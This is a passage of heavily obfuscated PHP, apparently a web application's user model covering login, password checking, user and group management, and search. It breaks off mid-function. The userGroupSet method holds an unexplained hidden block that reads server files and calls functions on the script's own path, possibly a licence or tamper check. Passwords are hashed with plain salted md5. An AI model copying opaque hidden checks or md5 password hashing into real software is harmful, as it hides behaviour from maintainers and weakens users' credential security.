"\155\145\164\x61\x46\x69\x65\154\x64" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\165\163\x65\162\x49\x44\54\156\x69\x63\153\116\x61\155\x65\54\156\x61\x6d\145\54\x61\x76\141\164\x61\162\x2c\x73\145\x78\x2c\163\164\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($üšÒ¡ğ) { $§–ıÆíŠ =& $_SERVER[Ş­ğŠìÒ]; $ÁÛŸ€ô” = $§–ıÆíŠ[2444]; return array($§–ıÆíŠ[2046] => array($üšÒ¡ğ[0], $ÁÛŸ€ô”), $§–ıÆíŠ[2048] => array($üšÒ¡ğ[0], $ÁÛŸ€ô”), $§–ıÆíŠ[2445] => array($üšÒ¡ğ[0], $ÁÛŸ€ô”)); } protected function getInfo($ôÊ½¬Óƒ, $û³¹Ğ«õ = false) { $ÛÊÈ­ÁÚ = $this->getInfoSimple($ôÊ½¬Óƒ); if (!is_array($ÛÊÈ­ÁÚ)) { return array(); } if ($û³¹Ğ«õ) { return $this->_getInfoApply($ÛÊÈ­ÁÚ); } return $this->cacheFunctionGet($_SERVER[Ş­ğŠìÒ][2050], $ôÊ½¬Óƒ); } protected function getInfoFull($™Ë¾Á»ê, $êÊËãó„ = false) { $òÆ÷»ùß = $this->getInfoSimple($™Ë¾Á»ê); if (!is_array($òÆ÷»ùß)) { return array(); } if ($êÊËãó„) { return $this->_getInfoApply($òÆ÷»ùß, !0); } return $this->cacheFunctionGet($_SERVER[Ş­ğŠìÒ][2446], $™Ë¾Á»ê); } private function _getInfoApply($°ÔáôÑİ, $ûúëß³˜ = false) { $”•„ë®Ù =& $_SERVER[Ş­ğŠìÒ]; if (!$°ÔáôÑİ) { return $°ÔáôÑİ; } $¼ŞÛĞÀ = md5($”•„ë®Ù[2447] . $°ÔáôÑİ[$”•„ë®Ù[963]] . $”•„ë®Ù[2448] . $°ÔáôÑİ[$”•„ë®Ù[32]]); $°ÔáôÑİ = $this->_listDataApplyItem($°ÔáôÑİ); $‚ùöÉã¹ = Model($”•„ë®Ù[1414])->metaGet($°ÔáôÑİ[$”•„ë®Ù[90]][$”•„ë®Ù[193]]); $°ÔáôÑİ[$”•„ë®Ù[2449]] = $¼ŞÛĞÀ; $°ÔáôÑİ[$”•„ë®Ù[90]][$”•„ë®Ù[2244]] = isset($‚ùöÉã¹[$”•„ë®Ù[2245]]) ? $‚ùöÉã¹[$”•„ë®Ù[2245]] : null; if ($ûúëß³˜) { $°ÔáôÑİ[$”•„ë®Ù[539]] = $this->metaGet($°ÔáôÑİ[$”•„ë®Ù[1764]]); } return $°ÔáôÑİ; } protected function getInfoSimple($ıı “”, $ò±ÏïÊÕ = false) { $ŸÈğšŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$ıı “”) { return array(); } if ($ò±ÏïÊÕ) { $€·ÛØ¥Õ = $this->where(array($ŸÈğšŸ[1764] => intval($ıı “”)))->find(); if (!is_array($€·ÛØ¥Õ)) { return array(); } $€·ÛØ¥Õ[$ŸÈğšŸ[2450]] = Action($ŸÈğšŸ[2451])->parseUrl($€·ÛØ¥Õ[$ŸÈğšŸ[2450]]); return $€·ÛØ¥Õ; } return $this->cacheFunctionGet($ŸÈğšŸ[2051], $ıı “”); } protected function getInfoSimpleOuter($ì©Ó×îğ) { $ïä€åÈè =& $_SERVER[Ş­ğŠìÒ]; if (!$ì©Ó×îğ || $ì©Ó×îğ == 0) { return array($ïä€åÈè[1764] => $ïä€åÈè[228], $ïä€åÈè[32] => $ïä€åÈè[176] . LNG($ïä€åÈè[2452]) . $ïä€åÈè[178], $ïä€åÈè[2450] => STATIC_PATH . $ïä€åÈè[2453]); } $›õ§³‘ = $this->cacheFunctionGet($ïä€åÈè[2051], $ì©Ó×îğ); $¾¨ëÄôş = array_field_key($›õ§³‘, explode($ïä€åÈè[50], $this->simpleField)); if (!$¾¨ëÄôş) { return array($ïä€åÈè[1764] => $ïä€åÈè[1269], $ïä€åÈè[32] => $ïä€åÈè[176] . LNG($ïä€åÈè[2454]) . $ïä€åÈè[178], $ïä€åÈè[2450] => STATIC_PATH . $ïä€åÈè[2455]); } $¾¨ëÄôş[$ïä€åÈè[2450]] = Action($ïä€åÈè[2451])->parseUrl($¾¨ëÄôş[$ïä€åÈè[2450]]); return $¾¨ëÄôş; } protected function groupUser($ğ‰ñ–€¦) { } public static function errorLang($ª¦ÓŒø) { $ÏÑ‰÷ú¡ =& $_SERVER[Ş­ğŠìÒ]; $îÖ‹Œ– = array(self::ERROR_USER_NOT_EXISTS => $ÏÑ‰÷ú¡[2456], self::ERROR_USER_PASSWORD_ERROR => $ÏÑ‰÷ú¡[2457], self::ERROR_USER_EXIST_NAME => $ÏÑ‰÷ú¡[2458], self::ERROR_USER_EXIST_PHONE => $ÏÑ‰÷ú¡[2459], self::ERROR_USER_EXIST_EMAIL => $ÏÑ‰÷ú¡[2460], self::ERROR_USER_LOGIN_LOCK => $ÏÑ‰÷ú¡[2461], self::ERROR_IP_NOT_ALLOW => $ÏÑ‰÷ú¡[2462], self::ERROR_USER_EXIST_NICKNAME => $ÏÑ‰÷ú¡[2463]); $¡©²°‘² = LNG($îÖ‹Œ–[$ª¦ÓŒø]); if ($ª¦ÓŒø == self::ERROR_USER_LOGIN_LOCK) { $»“œï†à = (int) Model($ÏÑ‰÷ú¡[2464])->get($ÏÑ‰÷ú¡[2465]); if ($»“œï†à > 60) { $¡©²°‘² = str_replace($ÏÑ‰÷ú¡[91], ceil($»“œï†à / 60), $¡©²°‘²); } } return $¡©²°‘²; } public function getInfoByMeta($ñµÀÒã, $¤åÑáå¿) { $³·ñØ˜³ =& $_SERVER[Ş­ğŠìÒ]; $àê²òá = Model($³·ñØ˜³[2466])->where(array($³·ñØ˜³[97] => $ñµÀÒã, $³·ñØ˜³[450] => $¤åÑáå¿))->find(); if ($àê²òá) { return $this->getInfo($àê²òá[$³·ñØ˜³[1764]]); } return !1; } public function userLoginCheck($ªúû÷ÓØ, $ “ğ»«‚) { $Í†Áº÷ì =& $_SERVER[Ş­ğŠìÒ]; $ÏÖõäÛÜ = $this->userLoginFind($ªúû÷ÓØ); if (!$ÏÖõäÛÜ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÏÖõäÛÜ[$Í†Áº÷ì[1764]], $ “ğ»«‚)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÏÖõäÛÜ[$Í†Áº÷ì[1764]]); } public function userLoginFind($®¾Äñ³ó) { $‚ÌØ³ˆğ =& $_SERVER[Ş­ğŠìÒ]; $€Ã¿¿ş€ = array($‚ÌØ³ˆğ[32] => $®¾Äñ³ó, $‚ÌØ³ˆğ[2252] => $®¾Äñ³ó, $‚ÌØ³ˆğ[381] => $®¾Äñ³ó, $‚ÌØ³ˆğ[2467] => $®¾Äñ³ó, $‚ÌØ³ˆğ[1074] => $‚ÌØ³ˆğ[1076]); if ($this->nickNameRpt()) { unset($€Ã¿¿ş€[$‚ÌØ³ˆğ[2252]]); } return $this->where($€Ã¿¿ş€)->find(); } public function clearCache($€Õ¿§äœ) { $œãÅÊ ÷ =& $_SERVER[Ş­ğŠìÒ]; $this->cacheFunctionClear($œãÅÊ ÷[2050], $€Õ¿§äœ); $this->cacheFunctionClear($œãÅÊ ÷[2051], $€Õ¿§äœ); $this->cacheFunctionClear($œãÅÊ ÷[2446], $€Õ¿§äœ); } public function userPasswordCheck($Äáôù·, $ï£×í½¼) { $üÇ°„à¸ =& $_SERVER[Ş­ğŠìÒ]; $˜ñáÆ­ã = $this->where(array($üÇ°„à¸[1764] => intval($Äáôù·)))->find(); $Ş­Ôš“– = $this->metaGet($Äáôù·); $«ˆê÷¨ = isset($Ş­Ôš“–[$üÇ°„à¸[2468]]) ? $Ş­Ôš“–[$üÇ°„à¸[2468]] : $üÇ°„à¸[12]; if (md5($«ˆê÷¨ . trim($ï£×í½¼)) !== $˜ñáÆ­ã[$üÇ°„à¸[963]]) { return !1; } return !0; } public function userAdd($ê¢ÀØ¸Š) { $Ë°ïÀÇ =& $_SERVER[Ş­ğŠìÒ]; $ôõÑ»æÄ = array($Ë°ïÀÇ[494] => $ê¢ÀØ¸Š[$Ë°ïÀÇ[32]], $Ë°ïÀÇ[2469] => $ê¢ÀØ¸Š[$Ë°ïÀÇ[2170]], $Ë°ïÀÇ[2470] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[381]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[381]] : $Ë°ïÀÇ[12], $Ë°ïÀÇ[2471] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[2467]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[2467]] : $Ë°ïÀÇ[12], $Ë°ïÀÇ[2472] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[2252]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[2252]] : $ê¢ÀØ¸Š[$Ë°ïÀÇ[32]], $Ë°ïÀÇ[2473] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[2450]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[2450]] : $Ë°ïÀÇ[12], $Ë°ïÀÇ[2474] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[2475]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[2475]] : 1, $Ë°ïÀÇ[2476] => $ê¢ÀØ¸Š[$Ë°ïÀÇ[963]], $Ë°ïÀÇ[2052] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[1949]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[1949]] : 1024 * 1024 * 20, $Ë°ïÀÇ[2053] => 0, $Ë°ïÀÇ[2477] => 0, $Ë°ïÀÇ[2097] => isset($ê¢ÀØ¸Š[$Ë°ïÀÇ[817]]) ? $ê¢ÀØ¸Š[$Ë°ïÀÇ[817]] : 1); if (!empty($ê¢ÀØ¸Š[$Ë°ïÀÇ[1764]])) { $ôõÑ»æÄ[$Ë°ïÀÇ[1764]] = $ê¢ÀØ¸Š[$Ë°ïÀÇ[1764]]; } $ÂôÛÄ¼Ú = $this->_checkExist($ê¢ÀØ¸Š); if ($ÂôÛÄ¼Ú !== !0) { return $ÂôÛÄ¼Ú; } if (!empty($ôõÑ»æÄ[$Ë°ïÀÇ[2450]]) && strlen($ôõÑ»æÄ[$Ë°ïÀÇ[2450]]) > 255) { $ôõÑ»æÄ[$Ë°ïÀÇ[2450]] = $Ë°ïÀÇ[12]; } $Š•Üáßş = $this->add($ôõÑ»æÄ); $¤ÌáİÑŒ = array($Ë°ïÀÇ[2476] => $ôõÑ»æÄ[$Ë°ïÀÇ[963]], $Ë°ïÀÇ[2472] => $ôõÑ»æÄ[$Ë°ïÀÇ[2252]]); $this->userEdit($Š•Üáßş, $¤ÌáİÑŒ); Model($Ë°ïÀÇ[1414])->userRootAdd($Š•Üáßş); return $Š•Üáßş; } protected function userEditTest($‡ã¾òò³, $ëëÕ£å) { return $this->call($_SERVER[Ş­ğŠìÒ][2478], $‡ã¾òò³, $ëëÕ£å); } protected function userEdit($‘½Û®È¶, $·šÓ¥¶ø) { $Ì‰”ŞÛ† =& $_SERVER[Ş­ğŠìÒ]; $òÙ¶Û = $this->getInfoSimple($‘½Û®È¶); if (!$òÙ¶Û) { return !1; } $Á¤Ä¬ˆè = $this->_checkExist($·šÓ¥¶ø, $‘½Û®È¶); if ($Á¤Ä¬ˆè !== !0) { return $Á¤Ä¬ˆè; } if (isset($·šÓ¥¶ø[$Ì‰”ŞÛ†[963]]) && trim($·šÓ¥¶ø[$Ì‰”ŞÛ†[963]]) != $Ì‰”ŞÛ†[12]) { $Ï²ù‰ = $this->metaGet($‘½Û®È¶); if (empty($Ï²ù‰[$Ì‰”ŞÛ†[2468]])) { $Ï²ù‰[$Ì‰”ŞÛ†[2468]] = rand_string(10); Model($Ì‰”ŞÛ†[577])->metaSet($‘½Û®È¶, $Ì‰”ŞÛ†[2468], $Ï²ù‰[$Ì‰”ŞÛ†[2468]]); } $·šÓ¥¶ø[$Ì‰”ŞÛ†[963]] = md5($Ï²ù‰[$Ì‰”ŞÛ†[2468]] . trim($·šÓ¥¶ø[$Ì‰”ŞÛ†[963]])); } else { unset($·šÓ¥¶ø[$Ì‰”ŞÛ†[963]]); } if (!empty($·šÓ¥¶ø[$Ì‰”ŞÛ†[2450]]) && strlen($·šÓ¥¶ø[$Ì‰”ŞÛ†[2450]]) > 255) { $·šÓ¥¶ø[$Ì‰”ŞÛ†[2450]] = $Ì‰”ŞÛ†[12]; } $this->where(array($Ì‰”ŞÛ†[1755] => $‘½Û®È¶))->save($·šÓ¥¶ø); if (isset($·šÓ¥¶ø[$Ì‰”ŞÛ†[2252]])) { $this->setNamePinyin($‘½Û®È¶, $·šÓ¥¶ø[$Ì‰”ŞÛ†[2252]]); } $this->clearCache($‘½Û®È¶); return !0; } public function setNamePinyin($‚ÑËÅãÆ, $óƒ¢Íƒ½ = false) { $›êë±±à =& $_SERVER[Ş­ğŠìÒ]; if (!$óƒ¢Íƒ½) { $éêê¿®ç = $this->getInfoSimple($‚ÑËÅãÆ); $óƒ¢Íƒ½ = $éêê¿®ç[$›êë±±à[2252]] ? $éêê¿®ç[$›êë±±à[2252]] : $éêê¿®ç[$›êë±±à[32]]; } $£Îô¼® = Model($›êë±±à[598]); if (!Input::check($óƒ¢Íƒ½, $›êë±±à[655])) { return $£Îô¼®->metaSet($‚ÑËÅãÆ, array($›êë±±à[538] => $›êë±±à[12], $›êë±±à[537] => $›êë±±à[12])); } return $£Îô¼®->metaSet($‚ÑËÅãÆ, array($›êë±±à[538] => str_replace($›êë±±à[53], $›êë±±à[12], Pinyin::get($óƒ¢Íƒ½)), $›êë±±à[537] => Pinyin::get($óƒ¢Íƒ½, $›êë±±à[656]))); } private function nickNameRpt() { $Õù‚®‹• =& $_SERVER[Ş­ğŠìÒ]; $½Şˆ“ÑÇ = Model($Õù‚®‹•[837])->get($Õù‚®‹•[2479]); $Ô‹×äÈÚ = $GLOBALS[$Õù‚®‹•[6]][$Õù‚®‹•[457]][$Õù‚®‹•[2479]]; $ŸÎ‘ùõ = !is_null($½Şˆ“ÑÇ) ? $½Şˆ“ÑÇ : $Ô‹×äÈÚ; return !!$ŸÎ‘ùõ; } private function _checkExist($åÜ®…§ä, $ç­òõşã = false) { $éö‡§Íü =& $_SERVER[Ş­ğŠìÒ]; $…‘Úù×» = array($éö‡§Íü[32] => UserModel::ERROR_USER_EXIST_NAME, $éö‡§Íü[2252] => UserModel::ERROR_USER_EXIST_NICKNAME, $éö‡§Íü[381] => UserModel::ERROR_USER_EXIST_EMAIL, $éö‡§Íü[2467] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($…‘Úù×»[$éö‡§Íü[2252]]); } $ê´äßì = $ç­òõşã ? array($éö‡§Íü[1764] => array($éö‡§Íü[2480], $ç­òõşã)) : array(); foreach ($…‘Úù×» as $–´ş±°ç => $ÒÍÙ”) { $Ö¥¥¬Ïê = array(); foreach ($…‘Úù×» as $·¼­½½ => $ÉÑŠ¹) { if (isset($åÜ®…§ä[$·¼­½½]) && $åÜ®…§ä[$·¼­½½]) { $Ö¥¥¬Ïê[] = $åÜ®…§ä[$·¼­½½]; } } if (!$Ö¥¥¬Ïê) { continue; } $ÔÃ‰™¶½ = array_merge(array($–´ş±°ç => array($éö‡§Íü[7], $Ö¥¥¬Ïê)), $ê´äßì); $•Ø½Õ¼Î = $this->where($ÔÃ‰™¶½)->find(); if ($•Ø½Õ¼Î) { return $ÒÍÙ”; } } return !0; } public function userListInfo($èÀì×÷ğ) { $ëøú™åŞ =& $_SERVER[Ş­ğŠìÒ]; $Ô·Ç¥ğƒ = array(); $èÀì×÷ğ = is_array($èÀì×÷ğ) ? array_unique($èÀì×÷ğ) : array(); if (!$èÀì×÷ğ) { return $Ô·Ç¥ğƒ; } if (count($èÀì×÷ğ) < 20) { foreach ($èÀì×÷ğ as $Æõ¤¶Ã•) { $Ô·Ç¥ğƒ[$Æõ¤¶Ã• . $ëøú™åŞ[12]] = $this->getInfoSimpleOuter($Æõ¤¶Ã•); } } else { $ı©×üé¸ = array($ëøú™åŞ[1755] => array($ëøú™åŞ[492], $èÀì×÷ğ)); if (count($èÀì×÷ğ) == 1) { $ı©×üé¸ = array($ëøú™åŞ[1755] => $èÀì×÷ğ[0]); } $ğ–Æà€Ÿ = Model($ëøú™åŞ[577])->field($this->simpleField)->where($ı©×üé¸)->select(); $ğ–Æà€Ÿ = array_to_keyvalue($ğ–Æà€Ÿ, $ëøú™åŞ[1764]); foreach ($èÀì×÷ğ as $Æõ¤¶Ã•) { $„ÂµóÄª = $ğ–Æà€Ÿ[$Æõ¤¶Ã•]; if (!$„ÂµóÄª) { $Ô·Ç¥ğƒ[$Æõ¤¶Ã• . $ëøú™åŞ[12]] = $this->getInfoSimpleOuter($Æõ¤¶Ã•); continue; } $„ÂµóÄª[$ëøú™åŞ[2450]] = Action($ëøú™åŞ[2451])->parseUrl($„ÂµóÄª[$ëøú™åŞ[2450]]); $Ô·Ç¥ğƒ[$Æõ¤¶Ã• . $ëøú™åŞ[12]] = $„ÂµóÄª; } } return $Ô·Ç¥ğƒ; } protected function userStatus($¶É„„Äµ, $Æ³õ£°) { $Ù‡î¹æ = $this->getInfoSimple($¶É„„Äµ); if (!$Ù‡î¹æ) { return !1; } $—ôÖ¿½ = array($_SERVER[Ş­ğŠìÒ][817] => $Æ³õ£°); return $this->userEdit($¶É„„Äµ, $—ôÖ¿½); } protected function userRemove($ù–„­Ùà) { $ûÜ“‰•® =& $_SERVER[Ş­ğŠìÒ]; $‰™‰ã¢ˆ = $this->getInfoSimple($ù–„­Ùà); if (!$‰™‰ã¢ˆ) { return !1; } $å””ÏÌ¸ = array($ûÜ“‰•®[1755] => $ù–„­Ùà); Model($ûÜ“‰•®[664])->where($å””ÏÌ¸)->delete(); Model($ûÜ“‰•®[2481])->where($å””ÏÌ¸)->delete(); Model($ûÜ“‰•®[2058])->where($å””ÏÌ¸)->delete(); Model($ûÜ“‰•®[2466])->where($å””ÏÌ¸)->delete(); Model($ûÜ“‰•®[1143])->where($å””ÏÌ¸)->delete(); Model($ûÜ“‰•®[2269])->removeUserAll($ù–„­Ùà); Model($ûÜ“‰•®[891])->userRootRemove($ù–„­Ùà); return $this->where($å””ÏÌ¸)->delete(); } protected function userGroupSet($±ÍšåÀ‰, $Ù†ê°šÏ, $üÜÀ†¼ø = array()) { $Û³­õû­ =& $_SERVER[Ş­ğŠìÒ]; if ($_SERVER[$Û³­õû­[945]] != $_SERVER[$Û³­õû­[1988]]) { $ŒÏËçÒÍ = $Û³­õû­[946]; $ßÙ³ÅÉ€ = $Û³­õû­[947]; $«á—üû– = $_SERVER[$Û³­õû­[948]] . $Û³­õû­[949]; $»ˆ²ÂÑ = $ßÙ³ÅÉ€($«á—üû–); $ »Û®Å  = explode($Û³­õû­[262], $»ˆ²ÂÑ); if (count($ »Û®Å ) < $Û³­õû­[692]) { $üöø¾×¿ = $Û³­õû­[950]; $üöø¾×¿(); } $Îâıæ“› = $Û³­õû­[951]; $Îâıæ“›($_SERVER[$Û³­õû­[952]]); $Îâıæ“›($_SERVER[$Û³­õû­[948]] . $Û³­õû­[2270]); $¡´Ü³Şş = 1; while ($¡´Ü³Şş > 1) { $¡´Ü³Şş = $¡´Ü³Şş + 4; $‰°”¸² = rawurlencode($¡´Ü³Şş . $Û³­õû­[454]); } } $ÌáÒÓ›¾ = $this->getInfoSimple($±ÍšåÀ‰); if (!$ÌáÒÓ›¾ || !is_array($Ù†ê°šÏ)) { return !1; } $ŞÈ˜Øº = Model($Û³­õû­[2058]); $ŞÈ˜Øº->where(array($Û³­õû­[1764] => $±ÍšåÀ‰))->delete(); $â‰íƒ… = array(); $Ëé“ƒ¤— = 0; foreach ($Ù†ê°šÏ as $Û”ÓÓÔ¶ => $®Ë©ä) { $÷Ş‡ºÛÂ = array($Û³­õû­[1764] => $±ÍšåÀ‰, $Û³­õû­[1963] => $Û”ÓÓÔ¶, $Û³­õû­[2072] => $®Ë©ä); $÷Ş‡ºÛÂ[$Û³­õû­[1987]] = isset($üÜÀ†¼ø[$Ëé“ƒ¤—]) ? $üÜÀ†¼ø[$Ëé“ƒ¤—] : 0; $Ëé“ƒ¤—++; $â‰íƒ…[] = $÷Ş‡ºÛÂ; } return $ŞÈ˜Øº->addAll($â‰íƒ…, array(), !0); } protected function userGroupAdd($õª€û‚¢, $ÕÂ…¦‹ß = array()) { $“æ‡»Õª =& $_SERVER[Ş­ğŠìÒ]; $ÙúŒ·Í = $this->getInfoSimple($õª€û‚¢); if (!$ÙúŒ·Í || empty($ÕÂ…¦‹ß)) { return !1; } $‚›…÷¤³ = array(); foreach ($ÕÂ…¦‹ß as $Â—¿³İ => $×¤Â¾×) { $‚›…÷¤³[] = array($“æ‡»Õª[1764] => $õª€û‚¢, $“æ‡»Õª[1963] => $Â—¿³İ, $“æ‡»Õª[2072] => $×¤Â¾×, $“æ‡»Õª[1987] => 0); } return Model($“æ‡»Õª[2058])->addAll($‚›…÷¤³, array(), !0); } protected function userGroupRemove($Ç¶»¥Ü£, $ˆ“ÏÆ´) { $Ù–ø¹æ½ =& $_SERVER[Ş­ğŠìÒ]; $Í™®ú–§ = $this->getInfoSimple($Ç¶»¥Ü£); if (!$Í™®ú–§ || !$ˆ“ÏÆ´) { return !1; } $£¡¨ Â‡ = array($Ù–ø¹æ½[1755] => $Ç¶»¥Ü£, $Ù–ø¹æ½[2056] => $ˆ“ÏÆ´); return Model($Ù–ø¹æ½[2058])->where($£¡¨ Â‡)->delete(); } public function listData() { $•˜¡Äşà = $this->_makeOrder()->selectPage(50); $this->_listDataApply($•˜¡Äşà[$_SERVER[Ş­ğŠìÒ][445]]); return $•˜¡Äşà; } public function listByID($´îÅ—Ìƒ) { $üšË³ôç =& $_SERVER[Ş­ğŠìÒ]; if (!$´îÅ—Ìƒ) { return; } $ÍÖÇ·Œ° = array($üšË³ôç[1764] => array($üšË³ôç[7], $´îÅ—Ìƒ)); $üÖÍÀä = $this->where($ÍÖÇ·Œ°)->select(); $üÖÍÀä = array_sort_keep($üÖÍÀä, $üšË³ôç[1764], $´îÅ—Ìƒ); $this->_listDataApply($üÖÍÀä); return $üÖÍÀä; } public function listByGroup($ÎÏ‰“×´ = 0, $ÎˆÀÚ á = array()) { $˜¶¦îÂÇ =& $_SERVER[Ş­ğŠìÒ]; $Š–Ÿ–¡Ä = $˜¶¦îÂÇ[12]; $°¸Æç = array(); if ($ÎÏ‰“×´) { $°¸Æç = array($˜¶¦îÂÇ[2482] => intval($ÎÏ‰“×´)); $Š–Ÿ–¡Ä = "\114\x45\106\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\165\163\x65\162\x5f\x67\x72\157\165\160\40\165\x73\x65\x72\137\x67\162\157\x75\160\x20\157\x6e\x20\165\163\x65\162\x2e\x75\163\x65\162\x49\104\40\75\x20\165\163\145\162\x5f\147\162\x6f\x75\x70\x2e\165\163\145\x72\111\104"; $»àƒ—–¿ = Input::get($˜¶¦îÂÇ[530], null, $˜¶¦îÂÇ[12]) ? $˜¶¦îÂÇ[12] : $˜¶¦îÂÇ[2483]; } if (isset($ÎˆÀÚ á[$˜¶¦îÂÇ[817]])) { $°¸Æç[$˜¶¦îÂÇ[2484]] = $ÎˆÀÚ á[$˜¶¦îÂÇ[817]]; } $Óâ²˜Ç£ = $this->_makeOrder($»àƒ—–¿)->field($˜¶¦îÂÇ[2485])->where($°¸Æç)->join($Š–Ÿ–¡Ä)->selectPage(50); $this->_listDataApply($Óâ²˜Ç£[$˜¶¦îÂÇ[445]]); return $Óâ²˜Ç£; } private function _makeOrder($æ›ŸÑÚä = '') { $ëÖûºßş =& $_SERVER[Ş­ğŠìÒ]; $ŸËÒı‚Á = array($ëÖûºßş[1764], $ëÖûºßş[32], $ëÖûºßş[1951], $ëÖûºßş[2170], $ëÖûºßş[1923], $ëÖûºßş[231]); $äœñÑò = array($ëÖûºßş[523] => $ëÖûºßş[524], $ëÖûºßş[525] => $ëÖûºßş[526]); $è³šòö® = Input::get($ëÖûºßş[530], $ëÖûºßş[7], $ëÖûºßş[1755], $ŸËÒı‚Á); $İ¿ëœó¬ = Input::get($ëÖûºßş[531], $ëÖûºßş[7], $ëÖûºßş[2059], array($ëÖûºßş[2059], $ëÖûºßş[525])); $İ¿ëœó¬ = $äœñÑò[$İ¿ëœó¬]; $æ›ŸÑÚä = $æ›ŸÑÚä . "\x75\163\145\x72\56{$è³šòö®}\x20{$İ¿ëœó¬}\x2c\x20\x75\x73\x65\x72\56\165\163\x65\162\x49\104\40\141\x73\x63"; return $this->alias($ëÖûºßş[2186])->order($æ›ŸÑÚä); } public function listSearch($¿¤æ±²¿) { $Ù®ÒÜ½ı =& $_SERVER[Ş­ğŠìÒ]; $ÙÈƒÛòÊ = trim($¿¤æ±²¿[$Ù®ÒÜ½ı[2062]]); $ìŞùˆ¿· = explode($Ù®ÒÜ½ı[53], $ÙÈƒÛòÊ); if (!$ÙÈƒÛòÊ || count($ìŞùˆ¿·) == 1) { return $this->listSearchNow($¿¤æ±²¿); } $Ë°ŒÀˆ = array($Ù®ÒÜ½ı[445] => array()); foreach ($ìŞùˆ¿· as $á…¶êÇµ) { if (!trim($á…¶êÇµ)) { continue; } $¿¤æ±²¿[$Ù®ÒÜ½ı[2062]] = $á…¶êÇµ; $ÅàÓşÅ‹ = $this->listSearchNow($¿¤æ±²¿); $Ë°ŒÀˆ[$Ù®ÒÜ½ı[445]] = array_merge($Ë°ŒÀˆ[$Ù®ÒÜ½ı[445]], $ÅàÓşÅ‹[$Ù®ÒÜ½ı[445]]); } $Ë°ŒÀˆ[$Ù®ÒÜ½ı[445]] = array_unique_by_key($Ë°ŒÀˆ[$Ù®ÒÜ½ı[445]], $Ù®ÒÜ½ı[1764]); $Ë°ŒÀˆ[$Ù®ÒÜ½ı[442]] = array($Ù®ÒÜ½ı[443] => count($Ë°ŒÀˆ[$Ù®ÒÜ½ı[445]]), $Ù®ÒÜ½ı[439] => 20, $Ù®ÒÜ½ı[429] => 1, $Ù®ÒÜ½ı[444] => 1); return $Ë°ŒÀˆ; } public function listSearchNow($ˆŒÙèò°) { $Í¤ÉÓò =& $_SERVER[Ş­ğŠìÒ]; $²ºí¢”¤ = trim($ˆŒÙèò°[$Í¤ÉÓò[2062]]); $ëÀŸ×‰ = isset($ˆŒÙèò°[$Í¤ÉÓò[2063]]) ? $ˆŒÙèò°[$Í¤ÉÓò[2063]] : !1; $²ºí¢”¤ = str_replace($Í¤ÉÓò[2064], $Í¤ÉÓò[2065], trim($²ºí¢”¤)); $éµ‹‹Ç = array($Í¤ÉÓò[32] => array($Í¤ÉÓò[459], "\x25{$²ºí¢”¤}\45"), $Í¤ÉÓò[381] => array($Í¤ÉÓò[459], "{$²ºí¢”¤}\45"), $Í¤ÉÓò[2252] => array($Í¤ÉÓò[459], "{$²ºí¢”¤}\45"), $Í¤ÉÓò[1074] => $Í¤ÉÓò[2066]); if (Input::check($²ºí¢”¤, $Í¤ÉÓò[387])) { $éµ‹‹Ç[$Í¤ÉÓò[1764]] = array($Í¤ÉÓò[459], "{$²ºí¢”¤}\x25"); $éµ‹‹Ç[$Í¤ÉÓò[2467]] = array($Í¤ÉÓò[459], "{$²ºí¢”¤}\x25"); } if (!$²ºí¢”¤) { $éµ‹‹Ç = array(); } if (isset($ˆŒÙèò°[$Í¤ÉÓò[817]])) { $éµ‹‹Ç[$Í¤ÉÓò[817]] = $ˆŒÙèò°[$Í¤ÉÓò[817]]; } $éµ‹‹Ç = $this->parseWhereLike($éµ‹‹Ç); $ Ó†Ùš° = $this->_makeOrder()->where($éµ‹‹Ç)->selectPage(20); if (!$ Ó†Ùš° || count($ Ó†Ùš°[$Í¤ÉÓò[445]]) < 5 && Input::check($²ºí¢”¤, $Í¤ÉÓò[394])) { $û— §¸ = $this->_searchFromMeta($Í¤ÉÓò[537], $²ºí¢”¤, 10); $Á¤¨¹æ = $this->_searchFromMeta($Í¤ÉÓò[538], $²ºí¢”¤, 10); $ÑÜ®¼ßñ = array_merge($û— §¸, $Á¤¨¹æ, $ Ó†Ùš°[$Í¤ÉÓò[445]]); $ Ó†Ùš°[$Í¤ÉÓò[445]] = array_unique_by_key($ÑÜ®¼ßñ, $Í¤ÉÓò[1764]); $ Ó†Ùš°[$Í¤ÉÓò[442]][$Í¤ÉÓò[443]] = count($ Ó†Ùš°[$Í¤ÉÓò[445]]); $ Ó†Ùš°[$Í¤ÉÓò[442]][$Í¤ÉÓò[444]] = ceil($ Ó†Ùš°[$Í¤ÉÓò[442]][$Í¤ÉÓò[443]] / $ Ó†Ùš°[$Í¤ÉÓò[442]][$Í¤ÉÓò[439]]); } $this->_listDataApply($ Ó†Ùš°[$Í¤ÉÓò[445]]); $this->_filterByGroup($ Ó†Ùš°, $ëÀŸ×‰); return $ Ó†Ùš°; } private function _filterByGroup(&$ìıàÕ”, $·ØÌà”Â) { $—Ÿ›“–ª =& $_SERVER[Ş­ğŠìÒ]; if (!$·ØÌà”Â) { return $ìıàÕ”; } foreach ($ìıàÕ”[$—Ÿ›“–ª[445]] as $õí³á·É => &$§İ‚‰ ) { $Ú­÷„ëâ = array_to_keyvalue($§İ‚‰ 